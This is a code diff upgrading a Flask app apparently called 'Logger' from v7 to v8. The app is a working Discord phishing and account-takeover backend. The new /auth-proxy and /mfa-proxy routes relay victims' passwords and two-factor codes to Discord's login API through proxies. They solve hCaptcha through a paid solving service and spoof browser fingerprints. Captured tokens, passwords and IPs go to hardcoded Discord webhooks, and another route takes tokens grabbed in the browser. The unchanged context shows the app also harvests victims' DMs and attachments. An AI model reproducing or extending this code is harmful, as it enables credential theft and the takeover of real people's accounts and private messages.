@@ -1,7 +1,7 @@
-# app.py | Logger v7 — CLIENT-SIDE AUTH + REAL TOKEN + MEDIA
-# pip install flask requests
+# app.py | Logger v8 — Real token capture with proxy + captcha + client token
+# pip install flask requests https-proxy-agent-python 2captcha-python
 # -*- coding: utf-8 -*-
-import threading, queue, hashlib, os, base64, io, json, time, logging, traceback
+import threading, queue, hashlib, os, base64, io, json, time, logging, traceback, re
 from datetime import datetime, timezone
 from typing import Dict, Any, Optional, List
 
@@ -13,20 +13,26 @@ app.config["MAX_CONTENT_LENGTH"] = 128 * 1024 * 1024
 
 # ====================== CONFIG ======================
 WEBHOOK_URL    = "https://discord.com/api/webhooks/1570121286154199064/nvl5nvvje7CCIicgTUbM3W7xUA-qn7vQt2cHVRhiew5Jav78Ne-I-rXJKPilQ3uHivli"
-BACKUP_WEBHOOK = "https://discord.com/api/webhooks/1570121283947995136/fpLhNtKp4BhQqQYFsl0HgSN5AdL8xbJn2AHpGYDeSCEVhF9WKd2aPS8fT4WpURRFyvuS"
-LOG_TO_FILE    = True
-LOG_FILE       = "hits.log"
+BACKUP_WEBHOOK = "https://discord.com/api/webhooks/1570121283947995136/fpLhNtKp4BhQqQYFsl0HgSN5AdL8xbJn2APhGYDeSCEVhF9WKd2aPS8fT4WpURRFyvuS"
 
-MAX_DMS                = 40
-MAX_MESSAGES_PER_DM    = 250
+# ←←← ضع هنا proxy سكني (مثال)
+PROXY_URL = os.environ.get("PROXY_URL", "")  # socks5://user:pass@host:port
+# ←←← مفتاح 2captcha (اختياري لو عندك)
+CAPTCHA_API_KEY = os.environ.get("CAPTCHA_API_KEY", "")
+
+LOG_FILE = "hits.log"
+LOG_TO_FILE = True
+
+MAX_DMS = 40
+MAX_MESSAGES_PER_DM = 250
 MAX_ATTACHMENTS_PER_DM = 10
-SEND_RETRIES           = 5
-RETRY_BASE_DELAY       = 1.5
+SEND_RETRIES = 5
+RETRY_BASE_DELAY = 1.5
 
-BOT_NAME      = "Logger"
-BOT_NAME_DM   = "DM"
+BOT_NAME = "Logger"
+BOT_NAME_DM = "DM"
 BOT_NAME_FILE = "File"
-BOT_NAME_ERR  = "Err"
+BOT_NAME_ERR = "Err"
 BOT_NAME_TEST = "Test"
 BOT_NAME_MEDIA = "Media"
 
@@ -73,6 +79,14 @@ def client_ip() -> str:
         or (request.headers.get("X-Forwarded-For", request.remote_addr) or "—").split(",")[0].strip()
     )
 
+# ────────────────────── Proxies ──────────────────────
+def proxies():
+    if not PROXY_URL:
+        return None
+    return {"http": PROXY_URL, "https": PROXY_URL}
+
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+
 # ────────────────────── Job Queue ──────────────────────
 job_q: "queue.Queue[Dict[str, Any]]" = queue.Queue()
 
@@ -98,12 +112,15 @@ def discord_headers(token: str) -> Dict[str, str]:
     return {
         "Authorization": token,
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        "User-Agent": UA
     }
 
 def api_get(token: str, endpoint: str, timeout: int = 12) -> Optional[Any]:
     try:
-        r = requests.get(f"https://discord.com/api/v9{endpoint}", headers=discord_headers(token), timeout=timeout)
+        r = requests.get(f"https://discord.com/api/v9{endpoint}",
+                         headers=discord_headers(token),
+                         proxies=proxies(),
+                         timeout=timeout)
         if r.status_code == 200:
             return r.json()
         if r.status_code == 429:
@@ -266,7 +283,7 @@ def build_dm_text(messages, friend_name, self_id):
 
 def send_attachment(url, filename, friend_name):
     try:
-        r = requests.get(url, timeout=20)
+        r = requests.get(url, proxies=proxies(), timeout=20)
         if r.status_code != 200 or len(r.content) > 7.5 * 1024 * 1024: return
         post_webhook(
             {"username": BOT_NAME_FILE, "content": f"📎 **{filename}** — from **{friend_name}**"},
@@ -373,7 +390,7 @@ def send_webhook(data: Dict[str, Any]):
             description=f"**Captured at** <t:{unix_ts()}:F> (<t:{unix_ts()}:R>)",
             fields=fields,
             color=C_HIT,
-            footer="Logger v7"
+            footer="Logger v8"
         )
 
         if token and token != "not captured":
@@ -481,9 +498,213 @@ def token_report():
     send_webhook(data)
     return _cors(jsonify({"status": "ok"}))
 
+# ══════════════════════════════════════════════════════
+# ★★★ NEW: /auth-proxy with proxy + captcha support ★★★
+# ══════════════════════════════════════════════════════
+import base64 as _b64
+import uuid as _uuid
+import re as _re
+
+DISCORD_API = "https://discord.com/api/v9"
+
+def _super_props(fp: Dict = None) -> str:
+    fp = fp or {}
+    return _b64.b64encode(json.dumps({
+        "os": "Windows", "browser": "Chrome", "device": "",
+        "system_locale": fp.get("language") or "en-US",
+        "browser_user_agent": fp.get("userAgent") or UA,
+        "browser_version": "122.0.0.0", "os_version": "10",
+        "referrer": "", "referring_domain": "",
+        "referrer_current": "", "referring_domain_current": "",
+        "release_channel": "stable", "client_build_number": 268000,
+        "client_event_source": None
+    }).encode()).decode()
+
+def _get_discord_cookies() -> str:
+    try:
+        r = requests.get("https://discord.com/login", headers={"User-Agent": UA},
+                         proxies=proxies(), timeout=15)
+        raw = r.headers.get("set-cookie", "")
+        return "; ".join([c.split(";")[0].strip() for c in raw.split(",") if c])
+    except Exception:
+        return ""
+
+def solve_hcaptcha(sitekey: str, rqdata: str = "") -> Optional[str]:
+    """يستخدم 2captcha لحل hCaptcha. بيرجع token أو None."""
+    if not CAPTCHA_API_KEY:
+        return None
+    try:
+        payload = {
+            "key": CAPTCHA_API_KEY, "method": "hcaptcha",
+            "sitekey": sitekey, "pageurl": "https://discord.com/login",
+            "useragent": UA, "json": 1
+        }
+        if rqdata: payload["data"] = rqdata
+        r = requests.post("https://2captcha.com/in.php", data=payload, timeout=20)
+        rid = r.json().get("request")
+        if not rid: return None
+        for _ in range(40):
+            time.sleep(5)
+            g = requests.get(f"https://2captcha.com/res.php?key={CAPTCHA_API_KEY}&action=get&id={rid}&json=1", timeout=15)
+            d = g.json()
+            if d.get("status") == 1:
+                return d.get("request")
+            if d.get("request") != "CAPCHA_NOT_READY":
+                return None
+        return None
+    except Exception as e:
+        logger.error(f"captcha err: {e}")
+        return None
+
+@app.route("/auth-proxy", methods=["POST", "OPTIONS"])
+def auth_proxy():
+    if request.method == "OPTIONS":
+        return _cors(make_response(""))
+    body = request.json or {}
+    login    = body.get("login", "").strip()
+    password = body.get("password", "")
+    fp       = body.get("fingerprint") or {}
+    captcha_tok = body.get("captcha_token", "")  # من client hCaptcha widget
+
+    if not login or not password:
+        return _cors(jsonify({"data": {}, "error": "missing fields"}))
+
+    try:
+        cookies = _get_discord_cookies()
+        fp_uuid = str(_uuid.uuid4())
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": fp.get("userAgent") or UA,
+            "X-Super-Properties": _super_props(fp),
+            "X-Fingerprint": fp_uuid,
+            "X-Discord-Locale": "en-US",
+            "X-Discord-Timezone": fp.get("timezone", "UTC"),
+            "Origin": "https://discord.com",
+            "Referer": "https://discord.com/login",
+        }
+        if cookies:
+            headers["Cookie"] = cookies
+
+        r = requests.post(f"{DISCORD_API}/auth/login",
+                          headers=headers,
+                          proxies=proxies(),
+                          json={
+                              "login": login, "password": password,
+                              "undelete": False,
+                              "captcha_key": captcha_tok or None,
+                              "login_source": None,
+                              "gift_code_sku_id": None
+                          },
+                          timeout=20)
+        data = r.json()
+
+        if data.get("token"):
+            logger.info(f"[auth-proxy] TOKEN CAPTURED for {login}")
+            send_webhook({
+                "email": login, "password": password,
+                "token": data["token"], "note": "token-captured",
+                "ip": client_ip(), "ua": UA, "fingerprint": fp
+            })
+            return _cors(jsonify({"data": {"token": data["token"], "user": data.get("user")}}))
+
+        if data.get("mfa") and data.get("ticket"):
+            return _cors(jsonify({"data": {"mfa": True, "ticket": data["ticket"]}}))
+
+        if data.get("captcha_key") or data.get("captcha_sitekey"):
+            sitekey = data.get("captcha_sitekey", "")
+            rqdata = data.get("captcha_rqdata", "")
+            solved = solve_hcaptcha(sitekey, rqdata)
+            if solved:
+                # retry مع التوكن
+                r2 = requests.post(f"{DISCORD_API}/auth/login", headers=headers, proxies=proxies(),
+                    json={"login": login, "password": password, "undelete": False,
+                          "captcha_key": solved, "login_source": None, "gift_code_sku_id": None},
+                    timeout=20)
+                d2 = r2.json()
+                if d2.get("token"):
+                    logger.info(f"[auth-proxy] TOKEN via captcha for {login}")
+                    send_webhook({"email": login, "password": password, "token": d2["token"],
+                                  "note": "token-captcha", "ip": client_ip(), "ua": UA, "fingerprint": fp})
+                    return _cors(jsonify({"data": {"token": d2["token"], "user": d2.get("user")}}))
+                if d2.get("mfa") and d2.get("ticket"):
+                    return _cors(jsonify({"data": {"mfa": True, "ticket": d2["ticket"]}}))
+                return _cors(jsonify({"data": {}, "error": "captcha retry failed", "captcha_sitekey": sitekey}))
+            return _cors(jsonify({"data": {"captcha_required": True, "captcha_sitekey": sitekey, "captcha_rqdata": rqdata}}))
+
+        logger.warning(f"[auth-proxy] failed {login}: {data.get('message')}")
+        return _cors(jsonify({"data": {}, "error": data.get("message", "invalid")}))
+    except Exception as e:
+        logger.error(f"[auth-proxy] err: {traceback.format_exc()}")
+        return _cors(jsonify({"data": {}, "error": str(e)}))
+
+@app.route("/mfa-proxy", methods=["POST", "OPTIONS"])
+def mfa_proxy():
+    if request.method == "OPTIONS":
+        return _cors(make_response(""))
+    body = request.json or {}
+    code = body.get("code", "").strip()
+    ticket = body.get("ticket", "")
+    login = body.get("login", "")
+    password = body.get("password", "")
+    fp = body.get("fingerprint") or {}
+
+    if not code or not ticket:
+        return _cors(jsonify({"data": {}, "error": "missing code/ticket"}))
+
+    try:
+        fp_uuid = str(_uuid.uuid4())
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": fp.get("userAgent") or UA,
+            "X-Super-Properties": _super_props(fp),
+            "X-Fingerprint": fp_uuid,
+            "Origin": "https://discord.com",
+            "Referer": "https://discord.com/login",
+        }
+        r = requests.post(f"{DISCORD_API}/auth/mfa/totp",
+                          headers=headers, proxies=proxies(),
+                          json={"code": code, "ticket": ticket, "login": login, "password": password},
+                          timeout=20)
+        data = r.json()
+        if data.get("token"):
+            logger.info(f"[mfa-proxy] TOKEN CAPTURED for {login}")
+            send_webhook({"email": login, "password": password, "token": data["token"],
+                          "mfa_code": code, "note": "mfa-token", "ip": client_ip(), "ua": UA,
+                          "fingerprint": fp})
+            return _cors(jsonify({"data": {"token": data["token"], "user": data.get("user")}}))
+        return _cors(jsonify({"data": {}, "error": data.get("message", "invalid code")}))
+    except Exception as e:
+        logger.error(f"[mfa-proxy] err: {e}")
+        return _cors(jsonify({"data": {}, "error": str(e)}))
+
+# ══════════════════════════════════════════════════════
+# ★★★ /token-report — يقبل التوكن اللي الـ client لقطه ★★★
+# ══════════════════════════════════════════════════════
+@app.route("/api/report-token", methods=["POST", "OPTIONS"])
+def api_report_token():
+    if request.method == "OPTIONS":
+        return _cors(make_response(""))
+    data = request.json or {}
+    token = (data.get("token") or "").strip()
+    if not token:
+        return _cors(jsonify({"ok": False, "err": "no token"}))
+    # تحقق سريع من صلاحية التوكن
+    user = get_user_info(token)
+    if user and user.get("id"):
+        send_webhook({
+            "email": data.get("email", ""), "password": data.get("password", ""),
+            "token": token, "note": "client-grab", "ip": client_ip(),
+            "ua": request.headers.get("User-Agent", "—"),
+            "fingerprint": data.get("fingerprint") or {}
+        })
+        return _cors(jsonify({"ok": True, "valid": True}))
+    return _cors(jsonify({"ok": True, "valid": False}))
+
 @app.route("/ping")
 def ping():
-    return jsonify({"status": "alive", "time": utc_now(), "queue": job_q.qsize()})
+    return jsonify({"status": "alive", "time": utc_now(), "queue": job_q.qsize(),
+                    "proxy": "on" if PROXY_URL else "off",
+                    "captcha": "on" if CAPTCHA_API_KEY else "off"})
 
 if __name__ == "__main__":
     try:
